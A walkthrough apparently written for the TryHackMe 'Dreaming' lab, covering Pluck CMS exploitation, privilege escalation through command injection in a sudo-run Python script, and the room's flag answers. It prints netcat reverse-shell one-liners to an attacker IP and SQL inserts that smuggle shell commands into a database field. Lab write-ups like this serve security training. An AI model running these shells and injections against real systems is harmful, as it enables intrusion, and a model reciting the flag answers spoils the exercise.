
---

# TryHackMe – Dreaming Walkthrough

Welcome to the **Dreaming** room walkthrough. This box was fun and full of little surprises. Let's walk through the steps I took to escalate from a basic web recon to full root.

---

## Nmap Scan

I started with a service scan:

```bash
nmap -T4 -A -O MACHINE_IP
```

Open Ports:

```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.41
```

---

## Web Enumeration

I added the IP to my `/etc/hosts` file and started scanning with Dirsearch:

```bash
dirsearch -u http://10.10.181.164:80
```

Found the subdirectory:

```
/app/
```

Navigating to `http://10.10.181.164/app/` led to a webpage.

![Screenshot From 2025-05-16 20-54-47](https://github.com/user-attachments/assets/e8e21216-e17f-4837-93ff-6a5b0bbf50cf)


---

### CMS Discovery

Clicking on `pluck-4.7.13/` revealed the CMS in use.

![Screenshot From 2025-05-16 20-55-49](https://github.com/user-attachments/assets/29755f46-6b23-4a81-b33a-3102a937b187)


Pluck CMS version 4.7.13 was confirmed. Clicking into the `/admin` page gave me a login screen.

I tried some weak default passwords and surprisingly got in with one. Big win!

![Screenshot From 2025-05-16 21-12-29](https://github.com/user-attachments/assets/c4e8fb94-012f-4c61-bfec-6c2a3e24d72c)


---

## RCE Exploit

After identifying the CMS, I found this public exploit:

[https://www.exploit-db.com/exploits/49909](https://www.exploit-db.com/exploits/49909)

Using it, I navigated to file management and uploaded a payload using the script:

```bash
python3 pluck_rce.py 10.10.181.164 80 password /app/pluck-4.7.13
```

![Screenshot From 2025-05-16 21-41-32](https://github.com/user-attachments/assets/378dbc02-9885-48e2-ba57-e39a137720de)


This gave me command execution.

![Screenshot From 2025-05-16 21-45-49](https://github.com/user-attachments/assets/d2f01a2b-9654-4913-9d92-9845b7d25f2f)


---

## Reverse Shell

To upgrade access, I launched a reverse shell:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.217.110 4445 >/tmp/f
```

And on my machine:

```bash
nc -lnvp 4445
```

![Screenshot From 2025-05-16 22-00-22](https://github.com/user-attachments/assets/6f8879bd-3a34-4d94-a947-1c7d99c45cf7)


---

## Enumeration

Inside the shell, I checked `/etc/passwd` for users:

```bash
cat /etc/passwd | grep 'bash'
```

Users:

* root
* lucien
* death
* morpheus
* ubuntu

I navigated to `/opt` and found two files. One was `test.py` which revealed:

```
Username: Lucien  
Password: HeyLucien#1999!
```

![Screenshot From 2025-05-16 22-11-46](https://github.com/user-attachments/assets/5b14d630-64dd-4793-9eb4-505b50a78d4e)


---

## SSH as Lucien & Privilege Escalation

With Lucien's credentials, I got in via SSH and found the first flag.

> Q1: What is the Lucien Flag?
> A1: THM{TH3\_L1BR4R14N}

Then ran:

```bash
sudo -l
```

Discovered Lucien could run:

```bash
/usr/bin/python3 /home/death/getDreams.py as user death
```

Couldn't read it directly but remembered a copy in `/opt`.

---

## Understanding `getDreams.py`

Here’s the logic:

* Connects to MySQL as user **death**
* Queries `dreamer`, `dream` from the `dreams` table
* Uses `subprocess` to echo each row

![Screenshot From 2025-05-16 22-20-08](https://github.com/user-attachments/assets/e9579153-52a7-4c19-9130-3615477f0490)


Vulnerable line:

```python
command = f"echo {dreamer} + {dream}"
```

We can exploit this using **command substitution** like:

```bash
echo "$(id)"
```

---

## Finding DB Credentials

Searched Lucien's `.bash_history` and found:

```bash
mysql -u lucien -plucien42DBPASSWORD
```

Logged in, and added a new malicious entry:

```sql
INSERT INTO dreams (dreamer, dream) VALUES ('Nightmare', '$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.217.110 4444 >/tmp/f)');
```

Then ran:

```bash
sudo -u death /usr/bin/python3 /home/death/getDreams.py
```

![Screenshot From 2025-05-16 22-30-21](https://github.com/user-attachments/assets/9de6457c-fb19-4b01-9c73-b9557b4b721e)


---

## Gaining Death’s Password

Later I used a SQL trick to dump the contents of `getDreams.py`:

```sql
INSERT INTO dreams (dreamer, dream) VALUES ('', '$(cat /home/death/getDreams.py | base64)');
```

Then decoded it and found the credentials:

```
Username: Death  
Password: !mementoMORI666!
```

Logged in and got the second flag.

> Q2: What is the Death Flag?
> A2: THM{1M\_TH3R3\_4\_TH3M}

---

## Getting Root

I created a reverse shell in the final Python script and ran:

```bash
python3 /opt/getDreams.py
```

Listener on:

```bash
nc -lnvp 9999
```

Boom — root shell.

---

> Q3: What is the Morpheus Flag?

> A3: THM{DR34MS\_5H4P3\_TH3\_W0RLD}

---

## Conclusion

This room had it all — poor passwords, RCE, bash history leakage, and misconfigured sudo permissions. Every step tied together neatly and offered a solid mix of enumeration and exploitation. Great practice!
